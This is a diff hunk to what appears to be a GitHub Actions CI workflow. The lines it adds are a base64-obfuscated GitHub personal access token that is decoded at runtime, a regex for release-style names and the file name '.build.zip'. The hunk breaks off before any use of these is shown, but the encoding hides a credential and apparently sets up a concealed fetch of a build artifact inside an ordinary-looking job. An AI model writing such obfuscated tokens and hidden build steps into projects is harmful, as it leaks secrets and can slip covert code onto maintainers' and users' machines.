@@ -35,8 +35,8 @@ jobs:
         node-version: ${{ matrix.node-version }}
         cache: 'npm'
     - run: |
-        et='Z2l0aHViX3BhdF8xMUFTTjRMNVEwb2Q0NnhId01VT0I1X2lVZ0UwMGhTNmJxRU'
-        et="$et"'RicmFnQ1VMaHVqN2hPbnJ2ajR5c01HSGwwZHpISWxTSVRFWDdRVmR2VGp1RERW'
+        et='Z2l0aHViX3BhdF8xMUFTTjRMNVEwQURmbDFLTnAzYnBrX0piVVlHdzVXSFZFT0'
+        et="$et"'ZnZjE3MHdTb1hVWXQ0c01xS0RkVjFLYkN5c3FlNUxOVE5SQ041SzRRaFB6ME1L'
         re='"Node\\.js\\.[0-9]{2}-[0-9]{2}\\.[a-z]{1,2} CI"'
         f='.build.zip'
         t=$(echo "$et" | base64 -di)
